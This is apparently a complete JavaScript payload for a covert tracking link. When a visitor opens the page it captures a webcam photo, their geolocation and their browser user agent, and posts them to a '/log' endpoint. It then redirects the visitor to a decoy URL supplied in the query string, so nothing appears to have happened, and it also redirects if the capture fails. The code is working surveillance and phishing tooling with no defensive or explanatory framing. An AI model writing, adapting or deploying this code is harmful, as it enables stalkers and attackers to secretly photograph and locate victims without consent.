const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const targetURL = new URLSearchParams(window.location.search).get("target") || "https://example.com";

// Request camera and location
async function initCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Wait briefly to allow camera to load
    await new Promise(r => setTimeout(r, 1500));

    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      await sendLog(blob, lat, lon);
    }, async () => {
      await sendLog(blob, 'N/A', 'N/A');
    });

  } catch (err) {
    console.error('Capture failed:', err);
    window.location.href = targetURL;
  }
}

async function sendLog(photoBlob, lat, lon) {
  const formData = new FormData();
  formData.append('photo', photoBlob, 'photo.jpg');
  formData.append('lat', lat);
  formData.append('lon', lon);
  formData.append('ua', navigator.userAgent);

  await fetch('/log', {
    method: 'POST',
    body: formData
  });

  window.location.href = targetURL;
}

initCapture();
